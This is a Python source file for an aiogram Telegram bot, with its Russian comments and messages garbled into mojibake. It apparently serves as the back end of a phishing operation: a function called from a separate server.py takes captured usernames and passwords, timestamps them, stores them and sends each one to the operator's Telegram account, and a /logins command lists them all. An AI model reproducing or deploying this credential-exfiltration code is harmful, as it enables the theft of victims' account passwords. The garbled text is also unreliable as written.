from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from datetime import datetime
import logging

API_TOKEN = "—Ç–≤–æ–π_—Ç–æ–∫–µ–Ω"  # ‚Üê –∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π
OWNER_ID = 123456789      # ‚Üê –∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π Telegram user ID

# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
logging.basicConfig(level=logging.INFO)

# –ë–æ—Ç –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä
bot = Bot(token=API_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

# –ü–∞–º—è—Ç—å
logins = []

# –ö–æ–º–∞–Ω–¥–∞ /start
@dp.message_handler(commands=["start"])
async def cmd_start(message: types.Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω. –ñ–¥—É –ª–æ–≥–∏–Ω—ã.")
    else:
        await message.answer("‚ùå –£ —Ç–µ–±—è –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")

# –ö–æ–º–∞–Ω–¥–∞ /logins
@dp.message_handler(commands=["logins"])
async def cmd_logins(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    if not logins:
        await message.answer("üì≠ –ü–æ–∫–∞ –ª–æ–≥–∏–Ω–æ–≤ –Ω–µ—Ç.")
    else:
        text = "üóÇ <b>–°–ø–∏—Å–æ–∫ –ª–æ–≥–∏–Ω–æ–≤:</b>\n\n" + "\n\n".join(logins)
        await message.answer(text)

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–∑–æ–≤–∞ –∏–∑ server.py
async def add_login(username, password):
    now = datetime.now().strftime("%d.%m.%Y %H:%M")
    msg = (
        f"<b>üîê –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω</b>\n"
        f"üë§ <b>–õ–æ–≥–∏–Ω:</b> {username}\n"
        f"üîë <b>–ü–∞—Ä–æ–ª—å:</b> {password}\n"
        f"üìÖ <b>–í—Ä–µ–º—è:</b> {now}"
    )
    logins.append(msg)
    await bot.send_message(chat_id=OWNER_ID, text=msg)

# –ó–∞–ø—É—Å–∫
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
